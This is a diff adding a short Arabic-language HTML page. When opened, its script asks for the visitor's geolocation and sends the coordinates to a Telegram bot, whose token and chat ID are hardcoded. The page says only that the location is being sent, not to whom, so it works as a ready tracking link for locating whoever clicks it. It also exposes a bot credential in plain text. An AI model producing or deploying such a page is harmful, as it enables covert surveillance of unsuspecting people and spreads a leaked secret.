@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال الموقع</title>
+</head>
+<body>
+    <h1>جاري إرسال موقعك...</h1>
+    <script>
+        // التوكن الخاص بالبوت
+        const token = "7655326139:AAEZd2vHJPL1J-llHvjM26RO823jQNtO88Y";
+
+        // معرف الدردشة (Chat ID)
+        const chat_id = "7499043737";
+
+        const botLocationUrl = `https://api.telegram.org/bot${token}/sendLocation`;
+
+        async function sendLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const { latitude, longitude } = position.coords;
+                    try {
+                        const response = await fetch(botLocationUrl, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id,
+                                latitude,
+                                longitude
+                            })
+                        });
+
+                        if (response.ok) {
+                            console.log("تم إرسال الموقع بنجاح");
+                            document.body.innerHTML = "<h1>تم إرسال موقعك بنجاح!</h1>";
+                        } else {
+                            console.error("خطأ في إرسال الموقع:", await response.text());
+                            document.body.innerHTML = "<h1>حدث خطأ أثناء إرسال الموقع.</h1>";
+                        }
+                    } catch (error) {
+                        console.error("خطأ في الطلب:", error);
+                        document.body.innerHTML = "<h1>حدث خطأ أثناء إرسال الموقع.</h1>";
+                    }
+                });
+            } else {
+                console.error("خاصية الموقع غير مدعومة.");
+                document.body.innerHTML = "<h1>خاصية الموقع غير مدعومة على جهازك.</h1>";
+            }
+        }
+
+        sendLocation();
+    </script>
+</body>
+</html>
